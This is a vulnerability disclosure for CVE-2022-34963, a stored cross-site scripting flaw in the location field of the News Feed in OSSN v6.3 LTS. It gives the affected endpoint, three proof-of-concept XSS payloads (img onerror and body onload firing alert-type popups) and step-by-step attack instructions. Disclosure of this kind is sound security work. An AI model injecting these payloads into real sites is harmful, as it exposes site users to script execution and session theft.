# OpenTeknik LLC OSSN OPEN SOURCE SOCIAL NETWORK v6.3 LTS

### Vulnerability Explanation:
OpenTeknik LLC OSSN OPEN SOURCE SOCIAL NETWORK v6.3 LTS was discovered to contain a stored cross-site scripting (XSS) vulnerability via the `News Feed` module.

### Attack Vectors:
The attacker must post something on the "news feed" and insert the XSS payload at the location input in order to exploit the stored XSS. The XSS payload will be launched immediately after submission.

### Affected: 
- http://ip_address:port/ossn/home

- POST /ossn/action/wall/post/a?ossn_ts=1656419179&ossn_token=83b0ebdb6b2bbbcbaa0b804ce5cf3b5fba29a25474715bf2f7e4bbbd85316a86

### Payload :
1. `<img/&#09;&#10;&#11; src=~ onerror=prompt('Grim-The-Ripper-Team-by-SOSECURE-Thailand')>`

2. `<BODY ONLOAD=alert('Grim-The-Ripper-Team-by-SOSECURE-Thailand')>`

3. `<img src=x onerror=confirm('Grim-The-Ripper-Team-by-SOSECURE-Thailand')>`

### Tested on: 
1. OSSN v6.3 LTS (https://github.com/opensource-socialnetwork/opensource-socialnetwork/releases/tag/6.3)

2. Google Chrome Version 102.0.5005.115 (Official Build) (x86_64)

### Steps to attack:
1. Login with username and password. (If you don't have an account, you can register)
2. Go to the "News Feed" or current page after logging in.
3. Enter data in the data entry form.
4. Click on the location button and enter the XSS payload.
5. The XSS payload will run immediately.

### Discoverer:
:shipit: Grim The Ripper Team by SOSECURE Thailand

### Medium:
- https://grimthereaperteam.medium.com/cve-2022-34963-ossn-6-3-lts-stored-xss-vulnerability-at-news-feed-b8ae8f2fa5f3

### Disclosure Timeline:
- 2022–06–28: Vulnerability discovered.
- 2022–06–28: Vulnerability reported to the MITRE corporation.
- 2022–07–08: CVE has been reserved.
- 2022–07–08: Public disclosure of the vulnerability.

Reference:
1. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34963
2. https://www.opensource-socialnetwork.org/
3. https://github.com/opensource-socialnetwork/opensource-socialnetwork/releases/tag/6.3
4. https://www.openteknik.com/contact?channel=ossn
